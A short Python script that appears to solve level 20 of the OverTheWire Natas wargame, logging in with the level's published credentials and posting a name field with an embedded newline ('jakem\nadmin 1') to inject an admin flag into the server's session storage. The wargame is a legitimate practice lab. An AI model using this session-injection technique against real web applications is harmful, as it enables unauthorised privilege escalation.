import requests as req

username = "natas20"
password = "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF"
url = "http://natas20.natas.labs.overthewire.org?debug"

session = req.Session()

response = session.get(url, auth=(username, password))
print(response.text)
print('\n*'*5)

response = session.post(url, data={"admin": '1'}, auth=(username, password))
print(response.text)
print('\n*'*5)

response = session.post(url, data={"name": 'jakem\nadmin 1'}, auth=(username, password))
print(response.text)
print('\n*'*5)

response = session.get(url, auth=(username, password))
print(response.text)
